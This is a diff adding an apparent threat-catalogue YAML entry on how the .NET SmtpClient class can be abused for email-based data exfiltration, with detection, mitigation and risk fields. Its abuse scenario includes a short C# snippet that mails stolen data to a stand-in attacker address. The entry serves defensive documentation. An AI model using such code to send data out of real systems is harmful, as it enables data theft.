@@ -1,0 +1,54 @@
+name: System.Net.Mail.SmtpClient
+category: windows-dotnet-api
+subcategory: command-and-control
+api:
+  namespace: System.Net.Mail
+  language: .NET 2.0+
+  documentation: https://learn.microsoft.com/en-us/dotnet/api/system.net.mail.smtpclient
+  class: SmtpClient
+abuse_scenarios:
+- name: Email-based C2 exfiltration
+  technique_id: T1048.003
+  description: Use SMTP to send stolen data via email
+  code_snippet: 'SmtpClient client = new SmtpClient("mail.server.com");
+
+    MailMessage msg = new MailMessage("attacker@domain.com", "attacker@domain.com");
+
+    msg.Body = exfiltrated_data;
+
+    client.Send(msg);'
+  detection_difficulty: medium
+  common_in_campaigns: false
+detection:
+- vendor: Network IDS
+  effectiveness: high
+  notes: Monitor for SMTP connections from unusual processes
+- vendor: Proxy logs
+  effectiveness: high
+  notes: Detect SMTP connections to external mail servers
+mitigation:
+- category: policy
+  description: Block external SMTP connections
+  feasibility: high
+risk:
+  severity: high
+  prevalence: low
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 30
+references:
+  techniques:
+  - T1048.003
+  threat_actors:
+  - Scattered
+  malware_families:
+  - Custom malware
+  tools:
+  - Custom scripts
+tags:
+- windows-dotnet-api
+- c2
+- exfiltration
+id: d22f4260-47ed-45e0-b3ed-645f2bece400
+author: magicsword-io
+created: '2026-02-02'
+verified: true
